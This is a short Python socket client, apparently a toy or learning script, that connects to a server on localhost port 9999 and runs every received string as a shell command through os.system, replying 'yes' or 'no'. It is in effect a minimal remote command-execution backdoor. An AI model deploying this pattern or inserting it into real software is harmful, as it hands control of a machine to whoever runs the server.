import socket
import os
from numpy import byte

server_add=('localhost',9999)

client=socket.socket()
client.connect(server_add)

while True:
    command=str(client.recv(1000).decode())
    if(command=="exit"):
        client.sendall(bytes("exit".encode()))
        break

    try:
        os.system(command)
        client.sendall(bytes("yes".encode()))
    except:
        client.sendall(bytes("no".encode()))

client.close()